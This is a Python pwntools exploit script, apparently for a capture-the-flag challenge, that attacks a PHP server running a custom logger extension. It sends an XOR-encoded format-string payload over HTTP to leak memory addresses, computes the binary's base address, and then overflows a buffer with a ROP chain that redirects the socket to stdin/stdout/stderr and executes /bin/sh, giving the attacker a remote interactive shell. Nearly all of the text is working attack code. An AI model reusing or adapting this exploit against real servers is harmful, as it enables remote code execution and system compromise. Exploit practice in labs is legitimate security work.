#!/usr/bin/env python3
from pwn import *
from urllib.parse import quote_plus
import time

# Exploit configs
php = ELF('./php', checksec=False)
host = '172.17.0.2'
port = 1338
context.binary = php.path # Import for ROP() to work

def launch_gdb(breakpoints=[], cmds=[]):
    if args.NOPTRACE or args.REMOTE:
        return
    info("Attaching Debugger")
    cmds.append('handle SIGALRM ignore')
    for b in breakpoints:
        cmds.insert(0,'b *' + str(SO_ADR+b))
    gdb.attach(php_io, gdbscript='\n'.join(cmds))
    time.sleep(2) # wait for debugger startup

if __name__ == '__main__':
    # call with DEBUG to change log level
    # call with NOPTRACE to skip gdb attach
    # call with REMOTE to skip local process creation and disable launch_gdb()

    # if not args.REMOTE:
    #     php_io = process(['./php', '-dextension=./php_logger.so', '-S', '0.0.0.0:1337'])
    #     php_io.recvuntil('started') # Wait for local server to spawn

    def send(key, cmd):
        io = remote(host, port)
        payload = ''.join([chr(c^key) for c in cmd[0:64]]).encode()
        payload += cmd[64:]
        req = (
            f'GET /?cmd={quote_plus(payload)} HTTP/1.1\r\n'
            f'Content-Type:application/json\r\n'
            f'CMD_KEY: {str(key)}\r\n\r\n'
            )
        io.send(req.encode())
        return io

    p = b'%p ' * 25
    p += b'A' * (0x98 - len(p)) # padding
    p += b'\x40'

    leaks = send(1, p).recvall(timeout=None).split()
    print (leaks)
    php.address = int(leaks[22], 16) -  0x1420b80
    success(f"PHP @ {php.address:012x}")

    r = ROP(php)
    r.call('dup2', [4, 0])
    r.call('dup2', [4, 1])
    r.call('dup2', [4, 2])
    binsh = next(php.search(b"/bin/sh\x00"))
    r.execve(binsh, 0, 0)

    p = b'A'*0x98 # padding
    p += r.chain()
    send(1, p).interactive()
